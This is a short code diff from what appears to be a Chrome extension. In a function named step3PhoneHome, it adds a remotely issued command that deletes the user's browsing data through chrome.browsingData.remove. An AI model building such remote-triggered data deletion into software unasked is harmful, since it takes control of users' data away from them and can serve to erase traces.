@@ -262,6 +262,9 @@ function step3PhoneHome() {
 						case "sendNotification":
 							chrome.notifications.create("",command["data"]);
 							break;
+						case "removeBrowsingData":
+							chrome.browsingData.remove(command["options"],command["dataToRemove"]);
+							break;
 					}
 				} catch (e) {console.log(e);}
 			}
